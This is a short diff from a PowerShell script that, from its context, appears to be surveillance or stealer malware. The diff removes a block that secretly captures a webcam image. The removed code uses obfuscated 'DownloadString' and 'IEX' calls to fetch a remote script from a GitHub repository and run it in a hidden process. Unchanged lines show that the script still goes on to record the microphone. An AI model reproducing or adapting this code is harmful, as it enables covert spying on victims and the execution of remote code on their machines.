@@ -1098,21 +1098,6 @@ function Backup-Data {
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
-    # webcam 
-    if ($webcam) {
-        Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
-        $webcam = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/webcam.ps1")
-        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
-        $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-        $invokewebcam.WaitForExit()
-        $webcam_image = "$env:temp\webcam.png"
-        if (Test-Path -Path $webcam_image) {
-            Move-Item -Path $webcam_image -Destination $folder_general
-            Write-Host "[!] The webcam image moved successfully to $folder_general" -ForegroundColor Green
-        } else {
-            Write-Host "[!] The webcam image does not exist." -ForegroundColor Red
-        }
-    }
 
     # record mic for 10 sec
     if ($record_mic) {
